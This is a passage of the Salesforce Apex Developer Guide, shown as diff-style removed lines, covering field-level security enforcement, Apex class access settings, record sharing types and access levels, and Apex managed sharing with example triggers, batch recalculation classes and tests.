-Example: If field access for Website is hidden, this query throws an exception indicating insufficient permissions.
-
-```
-      List<Account> act2 = [SELECT Id, parent.Name, parent.Website
-
-        FROM Account WITH SECURITY_ENFORCED]
-
-```
-
-Example: If field access for Type is hidden, this aggregate function query throws an exception indicating insufficient permissions.
-
-```
-      List<AggregateResult> agr1 = [SELECT GROUPING(Type)
-
-        FROM Opportunity WITH SECURITY_ENFORCED
-
-        GROUP BY Type]
-
-##### Class Security
-
-```
-
-You can specify which users can execute methods in a particular top-level class based on their user profile or permission sets. You can
-only set security on Apex classes, not on triggers.
-
-[To set Apex class security from the class list page, seeSet Apex Class Access from the Class List Page](https://help.salesforce.com/s/articleView?id=platform.code_apex_access_via_list.htm&type=5&language=en_US)
-
-[To set Apex class security from the class detail page, see Set Apex Class Access from the Class List Page](https://help.salesforce.com/s/articleView?id=platform.code_apex_access_via_detail.htm&type=5&language=en_US)
-
-To set Apex class security from a permission set:
-
-**1.** From Setup, enter _`Permission Sets`_ in the `Quick Find` box, then select **Permission Sets** .
-
-**2.** Select a permission set.
-
-**3.** Click **Apex Class Access** .
-
-**4.** Click **Edit** .
-
-**5.** Select the Apex classes that you want to enable from the Available Apex Classes list and click **Add**, or select the Apex classes that
-you want to disable from the Enabled Apex Classes list and click **Remove** .
-
-**6.** Click **Save** .
-
-To set Apex class security from a profile:
-
-**1.** From Setup, enter _`Profiles`_ in the `Quick Find` box, then select **Profiles** .
-
-**2.** Select a profile.
-
-**3.** In the Apex Class Access page or related list, click **Edit** .
-
-**4.** Select the Apex classes that you want to enable from the Available Apex Classes list and click **Add**, or select the Apex classes that
-you want to disable from the Enabled Apex Classes list and click **Remove** .
-
-**5.** Click **Save** .
-
-##### Understanding Apex Managed Sharing
-
-_Sharing_ is the act of granting a user or group of users permission to perform a set of actions on a record or set of records. Sharing access
-can be granted using the Salesforce user interface and Lightning Platform, or programmatically using Apex.
-
-For more information on sharing, see _Set Your Internal Organization-Wide Sharing Defaults_ in the Salesforce online help.
-
-
-Apex Developer Guide Working with Data in Apex
-
-###### Understanding Sharing
-
-_Sharing_ enables record-level access control for all custom objects, as well as many standard objects (such as Account, Contact,
-Opportunity and Case). Administrators first set an object’s organization-wide default sharing access level, and then grant additional
-access based on record ownership, the role hierarchy, sharing rules, and manual sharing. Developers can then use Apex managed
-sharing to grant additional access programmatically with Apex.
-
-Sharing a Record Using Apex
-
-Recalculating Apex Managed Sharing
-
-###### Understanding Sharing
-
-_Sharing_ enables record-level access control for all custom objects, as well as many standard objects (such as Account, Contact, Opportunity
-and Case). Administrators first set an object’s organization-wide default sharing access level, and then grant additional access based on
-record ownership, the role hierarchy, sharing rules, and manual sharing. Developers can then use Apex managed sharing to grant
-additional access programmatically with Apex.
-
-Most sharing for a record is maintained in a related sharing object, similar to an access control list (ACL) found in other platforms.
-
-Types of Sharing
-
-Salesforce has the following types of sharing:
-
-**Managed Sharing**
-Managed sharing involves sharing access granted by Lightning Platform based on record ownership, the role hierarchy, and sharing
-rules:
-
-**Record Ownership**
-Each record is owned by a user or optionally a queue for custom objects, cases and leads. The _record owner_ is automatically
-granted Full Access, allowing them to view, edit, transfer, share, and delete the record.
-
-**Role Hierarchy**
-The _role hierarchy_ enables users above another user in the hierarchy to have the same level of access to records owned by or
-shared with users below. Consequently, users above a record owner in the role hierarchy are also implicitly granted Full Access
-to the record, though this behavior can be disabled for specific custom objects. The role hierarchy is not maintained with sharing
-records. Instead, role hierarchy access is derived at runtime. For more information, see “Controlling Access Using Hierarchies” in
-the Salesforce online help.
-
-**Sharing Rules**
-_Sharing rules_ are used by administrators to automatically grant users within a given group or role access to records owned by a
-specific group of users. Sharing rules cannot be added to a package and cannot be used to support sharing logic for apps installed
-from AppExchange.
-
-Sharing rules can be based on record ownership or other criteria. You can’t use Apex to create criteria-based sharing rules. Also,
-criteria-based sharing cannot be tested using Apex.
-
-All implicit sharing added by Force.com managed sharing cannot be altered directly using the Salesforce user interface, SOAP API,
-or Apex.
-
-**User Managed Sharing, also known as Manual Sharing**
-User managed sharing allows the record owner or any user with Full Access to a record to share the record with a user or group of
-users. This is generally done by an end user, for a single record. Only the record owner and users above the owner in the role hierarchy
-are granted Full Access to the record. It is not possible to grant other users Full Access. Users with the “Modify All Records” object-level
-permission for the given object or the “Modify All Data” permission can also manually share a record. User managed sharing is
-removed when the record owner changes or when the access granted in the sharing does not grant additional access beyond the
-object's organization-wide sharing default access level.
-
-
-Apex Developer Guide Working with Data in Apex
-
-**Apex Managed Sharing**
-Apex managed sharing provides developers with the ability to support an application’s particular sharing requirements
-programmatically through Apex or the SOAP API. This type of sharing is similar to managed sharing. Only users with “Modify All
-Data” permission can add or change Apex managed sharing on a record. Apex managed sharing is maintained across record owner
-changes.
-
-Note: Apex sharing reasons and Apex managed sharing recalculation are only available for custom objects.
-
-The Sharing Reason Field
-
-In the Salesforce user interface, the `Reason` field on a custom object specifies the type of sharing used for a record. This field is called
-`rowCause` in Apex or the API.
-
-Each of the following list items is a type of sharing used for records. The tables show `Reason` field value, and the related `rowCause`
-value.
-
-**•** Managed Sharing
-
-`Reason Field` **Value** `rowCause` **Value (Used in Apex or the API)**
-
-Account Sharing `ImplicitChild`
-
-Associated record owner or sharing `ImplicitParent`
-
-Owner `Owner`
-
-Opportunity Team `Team`
-
-Sharing Rule `Rule`
-
-Territory Assignment Rule `TerritoryRule`
-
-**•** User Managed Sharing
-
-`Reason Field` **Value** `rowCause` **Value (Used in Apex or the API)**
-
-Manual Sharing `Manual`
-
-Territory Manual `TerritoryManual`
-
-Note: With Enterprise Territory Management in API
-version 45.0 and later,
-
-`Territory2AssociationManual` replaces
-`TerritoryManual` .
-
-**•** Apex Managed Sharing
-
-`Reason Field` **Value** `rowCause` **Value (Used in Apex or the API)**
-
-Defined by developer Defined by developer
-
-
-Apex Developer Guide Working with Data in Apex
-
-The displayed reason for Apex managed sharing is defined by the developer.
-
-Access Levels
-
-When determining a user’s access to a record, the most permissive level of access is used. Most share objects support the following
-access levels:
-
-**Access Level** **API Name** **Description**
-
-Private None
-
-Only the record owner and users above the record owner in the role hierarchy
-can view and edit the record. This access level only applies to the AccountShare
-object.
-
-Read Only Read The specified user or group can view the record only.
-
-Read/Write Edit The specified user or group can view and edit the record.
-
-Full Access All The specified user or group can view, edit, transfer, share, and delete the record.
-
-Note: This access level can only be granted with managed sharing.
-
-Sharing Considerations
-
-**Apex Triggers and User Record Sharing**
-If a trigger changes the owner of a record, the running user must have read access to the new owner’s user record if the trigger is
-started through the following:
-
-**•** API
-
-**•** Standard user interface
-
-**•** Standard Visualforce controller
-
-**•** Class defined with the `with sharing` keyword
-
-If a trigger is started through a class that’s not defined with the `with sharing` keyword, the trigger runs in system mode. In
-this case, the trigger doesn’t require the running user to have specific access.
-
-###### Sharing a Record Using Apex
-
-Important: Where possible, we changed noninclusive terms to align with our company value of Equality. We maintained certain
-terms to avoid any effect on customer implementations.
-
-To access sharing programmatically, you must use the share object associated with the standard or custom object for which you want
-to share. For example, AccountShare is the sharing object for the Account object, ContactShare is the sharing object for the Contact
-object. In addition, all custom object sharing objects are named as follows, where _`MyCustomObject`_ is the name of the custom
-object:
-
-```
-MyCustomObject __Share
-
-```
-
-Objects on the detail side of a master-detail relationship don’t have an associated sharing object. The detail record’s access is determined
-by the master’s sharing object and the relationship’s sharing setting. For more information, see “Custom Object Security” in the Salesforce
-Help.
-
-A share object includes records supporting all three types of sharing: managed sharing, user managed sharing, and Apex managed
-sharing. Sharing that is granted to users implicitly through organization-wide defaults, the role hierarchy, and permissions such as the
-
-
-Apex Developer Guide Working with Data in Apex
-
-“View All Records” and “Modify All Records” permissions for the given object, “View All Data,” and “Modify All Data” aren’t tracked with
-this object.
-
-Every share object has the following properties:
-
-**Property Name** **Description**
-
-```
-objectName AccessLevel
-
-```
-
-The level of access that the specified user or group has been granted for a share sObject. The name
-of the property is `AccessLevel` appended to the object name. For example, the property name
-for LeadShare object is `LeadAccessLevel` . Valid values are:
-
-**•** `Edit`
-
-**•** `Read`
-
-**•** `All`
-
-Note: The `All` access level is an internal value and can’t be granted.
-
-This field must be set to an access level that’s higher than the organization’s default access level for
-the parent object. For more information, see Understanding Sharing on page 224.
-
-`ParentID` The ID of the custom object. This field can’t be updated.
-
-`RowCause` The reason why the user or group is being granted access. The reason determines the type of sharing,
-which controls who can alter the sharing record. This field can’t be updated.
-
-`UserOrGroupId` The user or group IDs to which you’re granting access. A group can be:
-
-**•** A public group or a sharing group associated with a role.
-
-**•** A territory group.
-
-This field can’t be updated.
-
-Note: You can't grant access to unauthenticated guest users using Apex.
-
-You can share a standard or custom object with users or groups. For more information about the types of users and groups you can
-[share an object with, see User and Group in the](https://developer.salesforce.com/docs/atlas.en-us.260.0.object_reference.meta/object_reference/sforce_api_objects_user.htm) _[Object Reference for Salesforce](https://developer.salesforce.com/docs/atlas.en-us.260.0.object_reference.meta/object_reference/)_ .
-
-Creating User Managed Sharing Using Apex
-
-It’s possible to manually share a record to a user or a group using Apex or SOAP API. If the owner of the record changes, the sharing is
-automatically deleted. The following example class contains a method that shares the job specified by the job ID with the specified user
-or group ID with read access. It also includes a test method that validates this method. Before you save this example class, create a
-custom object called Job.
-
-Note: Manual shares written using Apex contains `RowCause="Manual"` by default. Only shares with this condition are
-removed when ownership changes.
-
-```
-public class JobSharing {
-
-  public static boolean manualShareRead(Id recordId, Id userOrGroupId){
-
-    // Create new sharing object for the custom object Job.
-
-    Job__Share jobShr = new Job__Share();
-
-    // Set the ID of record being shared.
-
-```
-
-
-Apex Developer Guide Working with Data in Apex
-
-```
-       jobShr.ParentId = recordId;
-
-       // Set the ID of user or group being granted access.
-
-       jobShr.UserOrGroupId = userOrGroupId;
-
-       // Set the access level.
-
-       jobShr.AccessLevel = 'Read';
-
-       // Set rowCause to 'manual' for manual sharing.
-
-       // This line can be omitted as 'manual' is the default value for sharing objects.
-
-       jobShr.RowCause = Schema.Job__Share.RowCause.Manual;
-
-       // Insert the sharing record and capture the save result.
-
-       // The false parameter allows for partial processing if multiple records passed
-
-       // into the operation.
-
-       Database.SaveResult sr = Database.insert(jobShr,false);
-
-       // Process the save results.
-
-       if(sr.isSuccess()){
-
-         // Indicates success
-
-         return true;
-
-       }
-
-       else {
-
-         // Get first save result error.
-
-         Database.Error err = sr.getErrors()[0];
-
-         // Check if the error is related to trival access level.
-
-         // Access level must be more permissive than the object's default.
-
-         // These sharing records are not required and thus an insert exception is
-
-   acceptable.
-
-         if(err.getStatusCode() == StatusCode.FIELD_FILTER_VALIDATION_EXCEPTION &&
-
-              err.getMessage().contains('AccessLevel')){
-
-           // Indicates success.
-
-           return true;
-
-         }
-
-         else{
-
-           // Indicates failure.
-
-           return false;
-
-         }
-
-        }
-
-     }
-
-   }
-
-   @isTest
-
-   private class JobSharingTest {
-
-     // Test for the manualShareRead method
-
-     static testMethod void testManualShareRead(){
-
-       // Select users for the test.
-
-       List<User> users = [SELECT Id FROM User WHERE IsActive = true LIMIT 2];
-
-       Id User1Id = users[0].Id;
-
-       Id User2Id = users[1].Id;
-
-       // Create new job.
-
-```
-
-
-Apex Developer Guide Working with Data in Apex
-
-```
-       Job__c j = new Job__c();
-
-       j.Name = 'Test Job';
-
-       j.OwnerId = user1Id;
-
-       insert j;
-
-       // Insert manual share for user who is not record owner.
-
-       System.assertEquals(JobSharing.manualShareRead(j.Id, user2Id), true);
-
-       // Query job sharing records.
-
-       List<Job__Share> jShrs = [SELECT Id, UserOrGroupId, AccessLevel,
-
-         RowCause FROM job__share WHERE ParentId = :j.Id AND UserOrGroupId= :user2Id];
-
-       // Test for only one manual share on job.
-
-       System.assertEquals(jShrs.size(), 1, 'Set the object\'s sharing model to Private.');
-
-       // Test attributes of manual share.
-
-       System.assertEquals(jShrs[0].AccessLevel, 'Read');
-
-       System.assertEquals(jShrs[0].RowCause, 'Manual');
-
-       System.assertEquals(jShrs[0].UserOrGroupId, user2Id);
-
-       // Test invalid job Id.
-
-       delete j;
-
-       // Insert manual share for deleted job id.
-
-       System.assertEquals(JobSharing.manualShareRead(j.Id, user2Id), false);
-
-     }
-
-   }
-
-```
-
-Important: The object’s organization-wide default access level must not be set to the most permissive access level. For custom
-objects, this level is Public Read/Write. For more information, see Understanding Sharing on page 224.
-
-Creating Apex Managed Sharing
-
-Apex managed sharing enables developers to programmatically manipulate sharing to support their application’s behavior through
-either Apex or SOAP API. This type of sharing is similar to managed sharing. Only users with “Modify All Data” permission can add or
-change Apex managed sharing on a record. Apex managed sharing is maintained across record owner changes.
-
-Apex managed sharing must use an _Apex sharing reason_ . Apex sharing reasons are a way for developers to track why they shared a record
-with a user or group of users. Using multiple Apex sharing reasons simplifies the coding required to make updates and deletions of
-sharing records. They also enable developers to share with the same user or group multiple times using different reasons.
-
-Note: Apex sharing reasons aren’t available in Lightning Experience. Use Salesforce Classic to create sharing reasons within the
-[UI. See Point and Click Customization for the complete list of differences in features and settings between Salesforce Classic and](https://help.salesforce.com/s/articleView?id=xcloud.lex_gaps_limitations_ui_customization.htm&type=5&language=en_US)
-Lightning Experience.
-
-Apex sharing reasons are defined on an object's detail page. Each Apex sharing reason has a label and a name:
-
-**•** The label displays in the `Reason` column when viewing the sharing for a record in the user interface. This label allows users and
-administrators to understand the source of the sharing. The label is also enabled for translation through the Translation Workbench.
-
-**•** The name is used when referencing the reason in the API and Apex.
-
-All Apex sharing reason names have the following format:
-
-```
-   MyReasonName__c
-
-```
-
-
-Apex Developer Guide Working with Data in Apex
-
-Apex sharing reasons can be referenced programmatically as follows:
-
-```
-   Schema. CustomObject__Share .rowCause. SharingReason__c
-
-```
-
-For example, an Apex sharing reason called Recruiter for an object called Job can be referenced as follows:
-
-```
-   Schema.Job__Share.rowCause.Recruiter__c
-
-```
-
-[For more information, see System.Schema Class.](https://developer.salesforce.com/docs/atlas.en-us.260.0.apexref.meta/apexref/apex_methods_system_schema.htm)
-
-To create an Apex sharing reason:
-
-**1.** From the management settings for the custom object, click **New** in the Apex Sharing Reasons related list.
-
-**2.** Enter a label for the Apex sharing reason. The label displays in the `Reason` column when viewing the sharing for a record in the
-user interface. The label is also enabled for translation through the Translation Workbench.
-
-**3.** Enter a name for the Apex sharing reason. The name is used when referencing the reason in the API and Apex. This name can contain
-only underscores and alphanumeric characters, and must be unique in your org. It must begin with a letter, not include spaces, not
-end with an underscore, and not contain two consecutive underscores.
-
-**4.** Click **Save** .
-
-Note: Apex sharing reasons and Apex managed sharing recalculation are only available for custom objects.
-
-Apex Managed Sharing Example
-
-For this example, suppose that you’re building a recruiting application and have an object called Job. You want to validate that the
-recruiter and hiring manager listed on the job have access to the record. The following trigger grants the recruiter and hiring manager
-access when the job record is created. This example requires a custom object called Job, with two lookup fields associated with User
-records called Hiring_Manager and Recruiter. Also, the Job custom object must have two sharing reasons added called Hiring_Manager
-and Recruiter.
-
-```
-   trigger JobApexSharing on Job__c (after insert) {
-
-      if(trigger.isInsert){
-
-        // Create a new list of sharing objects for Job
-
-        List<Job__Share> jobShrs = new List<Job__Share>();
-
-        // Declare variables for recruiting and hiring manager sharing
-
-        Job__Share recruiterShr;
-
-        Job__Share hmShr;
-
-        for(Job__c job : trigger.new){
-
-           // Instantiate the sharing objects
-
-           recruiterShr = new Job__Share();
-
-           hmShr = new Job__Share();
-
-           // Set the ID of record being shared
-
-           recruiterShr.ParentId = job.Id;
-
-           hmShr.ParentId = job.Id;
-
-           // Set the ID of user or group being granted access
-
-           recruiterShr.UserOrGroupId = job.Recruiter__c;
-
-           hmShr.UserOrGroupId = job.Hiring_Manager__c;
-
-           // Set the access level
-
-```
-
-
-Apex Developer Guide Working with Data in Apex
-
-```
-           recruiterShr.AccessLevel = 'edit';
-
-           hmShr.AccessLevel = 'read';
-
-           // Set the Apex sharing reason for hiring manager and recruiter
-
-           recruiterShr.RowCause = Schema.Job__Share.RowCause.Recruiter__c;
-
-           hmShr.RowCause = Schema.Job__Share.RowCause.Hiring_Manager__c;
-
-           // Add objects to list for insert
-
-           jobShrs.add(recruiterShr);
-
-           jobShrs.add(hmShr);
-
-        }
-
-        // Insert sharing records and capture save result
-
-        // The false parameter allows for partial processing if multiple records are passed
-
-        // into the operation
-
-        Database.SaveResult[] lsr = Database.insert(jobShrs,false);
-
-        // Create counter
-
-        Integer i=0;
-
-        // Process the save results
-
-        for(Database.SaveResult sr : lsr){
-
-           if(!sr.isSuccess()){
-
-             // Get the first save result error
-
-             Database.Error err = sr.getErrors()[0];
-
-             // Check if the error is related to a trivial access level
-
-             // Access levels equal or more permissive than the object's default
-
-             // access level are not allowed.
-
-             // These sharing records are not required and thus an insert exception is
-
-             // acceptable.
-
-             if(!(err.getStatusCode() == StatusCode.FIELD_FILTER_VALIDATION_EXCEPTION
-
-                                &&
-
-   err.getMessage().contains('AccessLevel'))){
-
-               // Throw an error when the error is not related to trivial access
-
-   level.
-
-               trigger.newMap.get(jobShrs[i].ParentId).
-
-                 addError(
-
-                 'Unable to grant sharing access due to following exception: '
-
-                 + err.getMessage());
-
-             }
-
-           }
-
-           i++;
-
-        }
-
-      }
-
-   }
-
-```
-
-Under certain circumstances, inserting a share row results in an update of an existing share row. Consider these examples:
-
-**•** A manual share access level is set to Read and you insert a new one set to Write. The original share rows are updated to Write,
-indicating the higher level of access.
-
-
-Apex Developer Guide Working with Data in Apex
-
-**•** Users can access an account because they can access its child records (contact, case, opportunity, and so on). If an account sharing
-rule is created, the sharing rule row cause (which is a higher access level) replaces the parent implicit share row cause, indicating
-the higher level of access.
-
-Important: The object’s organization-wide default access level must not be set to the most permissive access level. For custom
-objects, this level is Public Read/Write. For more information, see Understanding Sharing on page 224.
-
-Creating Apex Managed Sharing for Customer Community Plus users
-
-Customer Community Plus users are previously known as Customer Portal users. Share objects, such as `AccountShare` and
-`ContactShare`, aren’t available to these users. If you must use share objects as a Customer Community Plus user, consider using a
-trigger, which operates with the `without sharing` keyword by default. Otherwise, use an inner class with the same keyword to
-enable the DML operation to run successfully. A separate utility class can also be used to enable this access.
-
-Granting visibility via manual or apex shares written to the share objects is supported but the objects themselves aren't available to
-Customer Community Plus users. However, other users can add shares that grant access to Customer Community Plus users.
-
-Warning: After enabling digital experiences, records accessible to Roles and Subordinates via Apex managed sharing are
-automatically made accessible to Roles, Internal, and Portal Subordinates. To secure external users’ access, update your Apex code
-so that it creates shares to the Role and Internal Subordinates group. Because this conversion is a large-scale operation, consider
-using batch Apex.
-
-###### Recalculating Apex Managed Sharing
-
-Salesforce automatically recalculates sharing for all records on an object when its organization-wide sharing default access level changes.
-The recalculation adds managed sharing when appropriate. In addition, all types of sharing are removed if the access they grant is
-considered redundant. For example, manual sharing, which grants Read Only access to a user, is deleted when the object’s sharing
-model changes from Private to Public Read Only.
-
-To recalculate Apex managed sharing, you must write an Apex class that implements a Salesforce-provided interface to do the recalculation.
-You must then associate the class with the custom object, on the custom object's detail page, in the Apex Sharing Recalculation related
-list.
-
-Note: Apex sharing reasons and Apex managed sharing recalculation are only available for custom objects.
-
-You can execute this class from the custom object detail page where the Apex sharing reason is specified. An administrator might need
-to recalculate the Apex managed sharing for an object if a locking issue prevented Apex code from granting access to a user as defined
-by the application’s logic. You can also use the Database.executeBatch method to programmatically invoke an Apex managed sharing
-recalculation.
-
-Note: Every time a custom object's organization-wide sharing default access level is updated, any Apex recalculation classes
-defined for associated custom object are also executed.
-
-To monitor or stop the execution of the Apex recalculation, from Setup, enter _`Apex Jobs`_ in the `Quick Find` box, then select
-**Apex Jobs** .
-
-Creating an Apex Class for Recalculating Sharing
-
-To recalculate Apex managed sharing, you must write an Apex class to do the recalculation. This class must implement the
-Salesforce-provided interface `Database.Batchable` .
-
-The `Database.Batchable` interface is used for all batch Apex processes, including recalculating Apex managed sharing. You can
-implement this interface more than once in your organization. For more information on the methods that must be implemented, see
-Use Batch Apex on page 306.
-
-
-Apex Developer Guide Working with Data in Apex
-
-Before creating an Apex managed sharing recalculation class, also consider the best practices.
-
-Important: The object’s organization-wide default access level must not be set to the most permissive access level. For custom
-objects, this level is Public Read/Write. For more information, see Understanding Sharing on page 224.
-
-Apex Managed Sharing Recalculation Example
-
-For this example, suppose that you are building a recruiting application and have an object called Job. You want to validate that the
-recruiter and hiring manager listed on the job have access to the record. The following Apex class performs this validation. This example
-requires a custom object called Job, with two lookup fields associated with User records called Hiring_Manager and Recruiter. Also, the
-Job custom object should have two sharing reasons added called Hiring_Manager and Recruiter. Before you run this sample, replace
-the email address with a valid email address to which you want to send error notifications and job completion notifications.
-
-```
-   global class JobSharingRecalc implements Database.Batchable<sObject> {
-
-      // String to hold email address that emails will be sent to.
-
-      // Replace its value with a valid email address.
-
-      static String emailAddress = 'admin@yourcompany.com';
-
-      // The start method is called at the beginning of a sharing recalculation.
-
-      // This method returns a SOQL query locator containing the records
-
-      // to be recalculated.
-
-      global Database.QueryLocator start(Database.BatchableContext BC){
-
-        return Database.getQueryLocator([SELECT Id, Hiring_Manager__c, Recruiter__c
-
-                            FROM Job__c]);
-
-      }
-
-      // The executeBatch method is called for each chunk of records returned from start.
-
-      global void execute(Database.BatchableContext BC, List<sObject> scope){
-
-        // Create a map for the chunk of records passed into method.
-
-        Map<ID, Job__c> jobMap = new Map<ID, Job__c>((List<Job__c>)scope);
-
-        // Create a list of Job__Share objects to be inserted.
-
-        List<Job__Share> newJobShrs = new List<Job__Share>();
-
-        // Locate all existing sharing records for the Job records in the batch.
-
-        // Only records using an Apex sharing reason for this app should be returned.
-
-        List<Job__Share> oldJobShrs = [SELECT Id FROM Job__Share WHERE ParentId IN
-
-           :jobMap.keySet() AND
-
-           (RowCause = :Schema.Job__Share.rowCause.Recruiter__c OR
-
-           RowCause = :Schema.Job__Share.rowCause.Hiring_Manager__c)];
-
-        // Construct new sharing records for the hiring manager and recruiter
-
-        // on each Job record.
-
-        for(Job__c job : jobMap.values()){
-
-           Job__Share jobHMShr = new Job__Share();
-
-           Job__Share jobRecShr = new Job__Share();
-
-          // Set the ID of user (hiring manager) on the Job record being granted access.
-
-           jobHMShr.UserOrGroupId = job.Hiring_Manager__c;
-
-           // The hiring manager on the job should always have 'Read Only' access.
-
-```
-
-
-Apex Developer Guide Working with Data in Apex
-
-```
-           jobHMShr.AccessLevel = 'Read';
-
-           // The ID of the record being shared
-
-           jobHMShr.ParentId = job.Id;
-
-           // Set the rowCause to the Apex sharing reason for hiring manager.
-
-           // This establishes the sharing record as Apex managed sharing.
-
-           jobHMShr.RowCause = Schema.Job__Share.RowCause.Hiring_Manager__c;
-
-           // Add sharing record to list for insertion.
-
-           newJobShrs.add(jobHMShr);
-
-           // Set the ID of user (recruiter) on the Job record being granted access.
-
-           jobRecShr.UserOrGroupId = job.Recruiter__c;
-
-           // The recruiter on the job should always have 'Read/Write' access.
-
-           jobRecShr.AccessLevel = 'Edit';
-
-           // The ID of the record being shared
-
-           jobRecShr.ParentId = job.Id;
-
-           // Set the rowCause to the Apex sharing reason for recruiter.
-
-           // This establishes the sharing record as Apex managed sharing.
-
-           jobRecShr.RowCause = Schema.Job__Share.RowCause.Recruiter__c;
-
-         // Add the sharing record to the list for insertion.
-
-           newJobShrs.add(jobRecShr);
-
-        }
-
-        try {
-
-          // Delete the existing sharing records.
-
-          // This allows new sharing records to be written from scratch.
-
-           Delete oldJobShrs;
-
-          // Insert the new sharing records and capture the save result.
-
-          // The false parameter allows for partial processing if multiple records are
-
-          // passed into operation.
-
-          Database.SaveResult[] lsr = Database.insert(newJobShrs,false);
-
-          // Process the save results for insert.
-
-          for(Database.SaveResult sr : lsr){
-
-            if(!sr.isSuccess()){
-
-               // Get the first save result error.
-
-               Database.Error err = sr.getErrors()[0];
-
-               // Check if the error is related to trivial access level.
-
-               // Access levels equal or more permissive than the object's default
-
-               // access level are not allowed.
-
-               // These sharing records are not required and thus an insert exception
-
-               // is acceptable.
-
-              if(!(err.getStatusCode() == StatusCode.FIELD_FILTER_VALIDATION_EXCEPTION
-
-                          && err.getMessage().contains('AccessLevel'))){
-
-```
-
-
-Apex Developer Guide Working with Data in Apex
-
-```
-                 // Error is not related to trivial access level.
-
-                 // Send an email to the Apex job's submitter.
-
-              Messaging.SingleEmailMessage mail = new Messaging.SingleEmailMessage();
-
-                String[] toAddresses = new String[] {emailAddress};
-
-                mail.setToAddresses(toAddresses);
-
-                mail.setSubject('Apex Sharing Recalculation Exception');
-
-                mail.setPlainTextBody(
-
-                 'The Apex sharing recalculation threw the following exception: ' +
-
-                     err.getMessage());
-
-                Messaging.sendEmail(new Messaging.SingleEmailMessage[] { mail });
-
-               }
-
-            }
-
-          }
-
-        } catch(DmlException e) {
-
-          // Send an email to the Apex job's submitter on failure.
-
-           Messaging.SingleEmailMessage mail = new Messaging.SingleEmailMessage();
-
-           String[] toAddresses = new String[] {emailAddress};
-
-           mail.setToAddresses(toAddresses);
-
-           mail.setSubject('Apex Sharing Recalculation Exception');
-
-           mail.setPlainTextBody(
-
-            'The Apex sharing recalculation threw the following exception: ' +
-
-                  e.getMessage());
-
-           Messaging.sendEmail(new Messaging.SingleEmailMessage[] { mail });
-
-        }
-
-      }
-
-      // The finish method is called at the end of a sharing recalculation.
-
-      global void finish(Database.BatchableContext BC){
-
-        // Send an email to the Apex job's submitter notifying of job completion.
-
-        Messaging.SingleEmailMessage mail = new Messaging.SingleEmailMessage();
-
-        String[] toAddresses = new String[] {emailAddress};
-
-        mail.setToAddresses(toAddresses);
-
-        mail.setSubject('Apex Sharing Recalculation Completed.');
-
-        mail.setPlainTextBody
-
-                 ('The Apex sharing recalculation finished processing');
-
-        Messaging.sendEmail(new Messaging.SingleEmailMessage[] { mail });
-
-      }
-
-   }
-
-```
-
-Testing Apex Managed Sharing Recalculations
-
-This example inserts five Job records and invokes the batch job that is implemented in the batch class of the previous example. This
-example requires a custom object called Job, with two lookup fields associated with User records called Hiring_Manager and Recruiter.
-Also, the Job custom object should have two sharing reasons added called Hiring_Manager and Recruiter. Before you run this test, set
-the organization-wide default sharing for Job to Private. Note that since email messages aren’t sent from tests, and because the batch
-class is invoked by a test method, the email notifications won’t be sent in this case.
-
-```
-   @isTest
-
-   private class JobSharingTester {
-
-      // Test for the JobSharingRecalc class
-
-```
-
-
-Apex Developer Guide Working with Data in Apex
-
-```
-      static testMethod void testApexSharing(){
-
-        // Instantiate the class implementing the Database.Batchable interface.
-
-        JobSharingRecalc recalc = new JobSharingRecalc();
-
-        // Select users for the test.
-
-        List<User> users = [SELECT Id FROM User WHERE IsActive = true LIMIT 2];
-
-        ID User1Id = users[0].Id;
-
-        ID User2Id = users[1].Id;
-
-        // Insert some test job records.
-
-        List<Job__c> testJobs = new List<Job__c>();
-
-        for (Integer i=0;i<5;i++) {
-
-        Job__c j = new Job__c();
-
-           j.Name = 'Test Job ' + i;
-
-           j.Recruiter__c = User1Id;
-
-           j.Hiring_Manager__c = User2Id;
-
-           testJobs.add(j);
-
-        }
-
-        insert testJobs;
-
-        Test.startTest();
-
-        // Invoke the Batch class.
-
-        String jobId = Database.executeBatch(recalc);
-
-        Test.stopTest();
-
-        // Get the Apex job and verify there are no errors.
-
-        AsyncApexJob aaj = [Select JobType, TotalJobItems, JobItemsProcessed, Status,
-
-                    CompletedDate, CreatedDate, NumberOfErrors
-
-                    from AsyncApexJob where Id = :jobId];
-
-        System.assertEquals(0, aaj.NumberOfErrors);
-
-        // This query returns jobs and related sharing records that were inserted
-
-        // by the batch job's execute method.
-
-        List<Job__c> jobs = [SELECT Id, Hiring_Manager__c, Recruiter__c,
-
-           (SELECT Id, ParentId, UserOrGroupId, AccessLevel, RowCause FROM Shares
-
-           WHERE (RowCause = :Schema.Job__Share.rowCause.Recruiter__c OR
-
-           RowCause = :Schema.Job__Share.rowCause.Hiring_Manager__c))
-
-           FROM Job__c];
-
-        // Validate that Apex managed sharing exists on jobs.
-
-        for(Job__c job : jobs){
-
-           // Two Apex managed sharing records should exist for each job
-
-           // when using the Private org-wide default.
-
-           System.assert(job.Shares.size() == 2);
-
-           for(Job__Share jobShr : job.Shares){
-
-            // Test the sharing record for hiring manager on job.
-
-             if(jobShr.RowCause == Schema.Job__Share.RowCause.Hiring_Manager__c){
-
-               System.assertEquals(jobShr.UserOrGroupId,job.Hiring_Manager__c);
-
-               System.assertEquals(jobShr.AccessLevel,'Read');
-
-             }
-
-             // Test the sharing record for recruiter on job.
-
-```
-
-
-Apex Developer Guide Working with Data in Apex
-
-```
-             else if(jobShr.RowCause == Schema.Job__Share.RowCause.Recruiter__c){
-
-               System.assertEquals(jobShr.UserOrGroupId,job.Recruiter__c);
-
-               System.assertEquals(jobShr.AccessLevel,'Edit');
-
-             }
-
-           }
-
-        }
-
-      }
-
-   }
-
-```
-
-Associating an Apex Class Used for Recalculation
-
-An Apex class used for recalculation must be associated with a custom object.
-
-To associate an Apex managed sharing recalculation class with a custom object:
-
-**1.** From the management settings for the custom object, go to Apex Sharing Recalculations.
-
-**2.** Choose the Apex class that recalculates the Apex sharing for this object. The class you choose must implement the
-`Database.Batchable` interface. You cannot associate the same Apex class multiple times with the same custom object.
-
-**3.** Click **Save** .
-
-##### Security Tips for Apex and Visualforce Development
-
-Understanding Security
-
-The powerful combination of Apex and Visualforce pages allows Lightning Platform developers to provide custom functionality and
-business logic to Salesforce or to create a new standalone product running inside the Lightning Platform. But as with any programming
-language, developers must be cognizant of potential security-related pitfalls.
-
-Salesforce has incorporated several security defenses in the Lightning Platform. But careless developers can still bypass the built-in
-defenses and then expose their applications and customers to security risks. Many of the coding mistakes a developer can make on the
-Lightning Platform are similar to general web application security vulnerabilities, while others are unique to Apex.
-
-To certify an application for AppExchange, it’s important for developers to learn and understand the security flaws described. For more
